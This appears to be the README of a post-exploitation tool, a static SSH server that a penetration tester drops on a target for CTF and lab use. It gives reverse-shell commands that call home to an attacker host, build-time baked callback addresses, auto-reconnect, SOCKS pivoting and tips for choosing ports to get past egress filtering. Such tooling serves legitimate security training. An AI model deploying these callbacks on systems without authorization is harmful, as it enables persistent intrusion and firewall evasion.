# Tether

**A tiny, statically-linked SSH server with a reverse-connection feature — simple yet powerful remote access for CTFs, HackTheBox, and lab work.**

Catching a shell with `netcat` is fine until muscle-memory `Ctrl-C` kills it, or you realise you have no TAB-completion, no history, and no clean way to move files. Tether drops a single <2 MB static binary on the target and gives you a real SSH server instead: fully interactive shells, SFTP file transfer, and port forwarding. It runs as either a **bind** shell (you connect in) or a **reverse** shell (the target dials home), and in reverse mode it keeps itself alive across drops.

---

## Features

* **Fully interactive shell** — PTY, TAB-completion, history, job control (see [Windows caveats](#windows-caveats))
* **File transfer** over SFTP (`sftp`, `scp`)
* **Local / remote / dynamic** port forwarding (works as a SOCKS proxy)
* **Bind and reverse** modes
* **Auto-reconnect** in reverse mode — exponential backoff plus SSH keepalives, so a dropped callback re-establishes itself instead of dying
* **Graceful shutdown** on `Ctrl-C` / `SIGTERM`
* **Cross-platform** — Linux, macOS, and Windows on both x86 and ARM (`amd64`, `386`, `arm64`, `armv7`)
* **Customizable at build time** — bake in the password, key, shell, and call-home host/port so the dropped binary just works with no arguments

---

## Requirements

Running a prebuilt binary only needs what [Go itself supports](https://github.com/golang/go/wiki/MinimumRequirements#operating-systems):

* **Linux**: kernel 2.6.23+
* **Windows**: Windows 7 / Server 2008R2+
* **macOS**: any 64-bit Intel or Apple Silicon release supported by current Go

To build it yourself:

* Go **1.24 or newer**
* optionally `upx` for smaller binaries (`apt install upx-ucl`)

---

## Build

The quickest path is the `build.sh` wrapper:

```shell
$ ./build.sh          # build for your host OS/arch -> bin/tether (prints the login password)
$ ./build.sh all      # full release matrix: Linux/Windows/macOS on x86 + ARM
$ ./build.sh test     # bin/tether-test with predictable creds for local testing
```

Or use `make`:

```shell
$ make                # host + full release matrix into bin/
$ make compressed     # additionally pack every binary with upx
```

Binaries always land in `bin/`, named `tether-<os>-<arch>`.

### Baking in your own defaults

Every setting can be compiled in so the target binary needs no flags. With `build.sh`, pass them as env vars:

| Variable    | Effect                                                                                  |
|-------------|-----------------------------------------------------------------------------------------|
| `PASS`      | login password (default: random per build)                                              |
| `PUB`       | authorized public key                                                                   |
| `SHELL_BIN` | shell to spawn (default: `/bin/bash`)                                                    |
| `LHOST`     | default call-home host — **makes the binary default to reverse mode**                   |
| `LPORT`     | listen port (bind) or connect port (reverse); default `31337`                           |
| `BPORT`     | port bound on the attacker after dialling home; **`0` = any free port**                 |

```shell
# Generate your own key and bake it in
$ ssh-keygen -t ed25519 -f id_tether

# A reverse build that phones home to 10.10.14.5:443 on any free local port
$ LHOST=10.10.14.5 LPORT=443 BPORT=0 PUB="$(cat id_tether.pub)" ./build.sh all
```

> The equivalent `make` variables are `RS_PASS`, `RS_PUB`, `RS_SHELL`, `LUSER`, `LHOST`, `LPORT`, `BPORT`, and `NOCLI` (any value strips all CLI parsing). Cross-compile a single target with `GOOS`/`GOARCH`, e.g. `GOARCH=arm64 GOOS=linux make compressed`. `go tool dist list` shows every target.

---

## Usage

Tether is just an SSH server, so any `ssh`/`sftp`/`scp` client works. Connect with any username — auth is by password or key, not by user.

```shell
# Interactive shell
$ ssh  -p <PORT> <HOST>

# One-off command
$ ssh  -p <PORT> <HOST> whoami

# File transfer
$ sftp -P <PORT> <HOST>

# Dynamic port forwarding (SOCKS proxy on 9050)
$ ssh  -p <PORT> -D 9050 <HOST>
```

### Bind mode (you connect into the target)

```shell
# Target
target$ ./tether -l -p 2222

# You
you$ ssh -p 2222 <TARGET_IP>
```

Use `-p 0` to let the OS pick any free port — the chosen port is printed when you add `-v`.

### Reverse mode (target dials home)

```shell
# You (catch the callback; can be your own OpenSSH daemon instead)
you$ ./tether -v -l -p 443

# Target
target$ ./tether -v -p 443 <YOUR_IP>
```

The target connects out to your `:443` and remote-forwards a shell onto your loopback (default port `8888`, or any free port with `-b 0`). Then, from another terminal:

```shell
you$ ssh  -p 8888 127.0.0.1
you$ sftp -P 8888 127.0.0.1
```

If the callback drops, the target keeps redialling on its own (1 s → 30 s backoff), and keepalives detect a dead link within ~15 s.

> Egress filtered? Reverse mode goes *out* over the port you choose — pick one the firewall allows (443, 53, 80 are good bets). This is plain SSH, so you can also catch the callback with your existing OpenSSH daemon.

### SSH config shortcut

Copy the [private key](assets/id_tether) to `~/.ssh/` and add this to `~/.ssh/config` to just run `ssh target` / `sftp target`:

```
Host target
    Hostname 127.0.0.1
    Port 8888
    IdentityFile ~/.ssh/id_tether
    IdentitiesOnly yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

### Full flag reference

```
tether v1.3.0-dev

Usage: tether [options] [[<user>@]<target>]

  -l   Listening (bind) mode; overrides the reverse scenario
  -p   Listen port (bind) or connect port (reverse)        (default: 31337)
  -b   Reverse only: local port to bind after dialling home (default: 8888; 0 = any)
  -s   Shell to spawn for incoming connections              (default: /bin/bash)
       On Windows, a path to 'ssh-shellhost.exe' to enhance pre-Win10 shells
  -N   Deny all shell/exec/subsystem and local forwarding (remote forwarding only)
  -v   Emit log output
  -V   Print version and exit

<target>   Optional [user@]host that enables reverse mode
```

---

## Testing locally

Rehearse both scenarios on one machine. Build a binary with predictable creds (password `testpass123`, bundled key authorized):

```shell
$ ./build.sh test
$ chmod 600 assets/id_tether   # ssh refuses a world-readable private key
```

Add `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` to skip host-key prompts.

**Bind:**

```shell
victim$   ./bin/tether-test -v -l -p 2222
attacker$ ssh  -i assets/id_tether -p 2222 localhost
attacker$ sftp -P 2222 localhost                       # password: testpass123
```

**Reverse:**

```shell
attacker$ ./bin/tether-test -v -l -p 4444     # catcher (stays busy)
victim$   ./bin/tether-test -v -p 4444 localhost
# in a third terminal:
attacker$ ssh  -i assets/id_tether -p 8888 localhost
```

For a real two-machine test, swap `localhost` on the victim side for the attacker's IP.

Run the checks the CI runs:

```shell
$ go vet ./... && go test -race ./...
```

---

## Windows caveats

A fully interactive PowerShell relies on [ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and needs at least **Win10 Build 17763**. On older versions you still get a shell, but it can't handle virtual-terminal codes (arrow keys, `Ctrl-C`) — append `cmd`, i.e. `ssh <OPTIONS> <IP> cmd`.

For full interactivity on older Windows, drop [`ssh-shellhost.exe`](https://github.com/PowerShell/Win32-OpenSSH/releases/latest) next to `tether` and run with `-s ssh-shellhost.exe`.

---

**Use it only on systems you own or are explicitly authorized to test.**
